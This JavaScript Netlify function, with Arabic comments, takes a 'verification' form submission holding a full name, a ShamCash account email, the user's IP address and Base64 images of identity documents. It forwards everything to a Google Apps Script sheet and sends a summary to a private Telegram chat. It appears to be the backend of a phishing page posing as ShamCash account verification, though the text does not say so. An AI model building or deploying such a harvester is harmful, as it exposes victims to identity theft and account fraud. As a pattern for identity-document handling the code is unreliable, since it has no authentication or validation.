// netlify/functions/google-sheet-proxy.js

const axios = require('axios'); // هذه التبعية يجب أن تكون في package.json الرئيسي
const GOOGLE_APP_SCRIPT_WEB_APP_URL = process.env.GOOGLE_APP_SCRIPT_WEB_APP_URL; // سنضيف هذا المتغير في Netlify

// متغيرات تيليجرام الحالية التي تستخدمها وظيفة تيليجرام الأخرى
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

exports.handler = async function(event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    // تحقق من وجود URL لـ Google Apps Script
    if (!GOOGLE_APP_SCRIPT_WEB_APP_URL) {
        console.error("GOOGLE_APP_SCRIPT_WEB_APP_URL is not set in Netlify Environment Variables!");
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Server configuration error: Google Apps Script URL missing.' })
        };
    }

    let requestBody;
    let userIpAddress = 'غير معروف';

    // Netlify Functions تحلل event.body تلقائيا إذا كان Content-Type هو application/json
    // ولكن إذا كان Content-Type هو multipart/form-data (لتحميل الملفات)، فإن event.body سيكون Raw
    // هذا يتطلب معالجة خاصة.
    // بما أننا قررنا تحويل الصور إلى Base64 في الواجهة الأمامية وإرسالها كـ JSON،
    // فإن event.body سيكون JSON.

    try {
        requestBody = JSON.parse(event.body);
        userIpAddress = requestBody.payload.ipAddress; // IP الآن جزء من الـ payload
        // لا يوجد داعي لـ requestBody.ipAddress منفصل
    } catch (error) {
        console.error('Error parsing request body:', error);
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Invalid JSON body.' })
        };
    }

    const { type, payload } = requestBody; // 'payload' يحتوي على جميع بيانات النموذج والـ Base64 للصور

    // 1. إرسال البيانات إلى Google Apps Script Web App
    try {
        const googleSheetData = {
            action: 'addRecord', // إجراء سنعرفه في Google Apps Script
            data: payload // نرسل كامل الـ payload الذي يحتوي على كل البيانات والصور Base64
        };
        const googleAppsScriptResponse = await axios.post(GOOGLE_APP_SCRIPT_WEB_APP_URL, googleSheetData);
        console.log('Google Apps Script Response:', googleAppsScriptResponse.data);

    } catch (error) {
        console.error('Error sending data to Google Apps Script:', error.response ? error.response.data : error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Failed to send data to Google Sheets via Apps Script.' })
        };
    }

    // 2. إرسال إشعار إلى تيليجرام
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const telegramMessage = `
            <b>[حالة توثيق جديدة]</b>
            <b>الاسم:</b> ${payload.fullName || 'غير محدد'}
            <b>البريد:</b> ${payload.shamcashEmail || 'غير محدد'}
            <b>الـ IP:</b> ${userIpAddress || 'غير معروف'}
            <b>نوع الحساب:</b> ${payload.accountType || 'غير محدد'}
            <b>سبب الطلب:</b> ${payload.verificationReason || 'غير محدد'}
            <b>نوع الوثيقة:</b> ${payload.documentType || 'غير محدد'}
        `;
        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(telegramApiUrl, {
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'HTML'
            });
            console.log('Telegram notification sent!');
        } catch (error) {
            console.error('Error sending Telegram notification:', error.response ? error.response.data : error.message);
        }
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ success: true, message: 'Verification request sent and Telegram notified!' })
    };
};
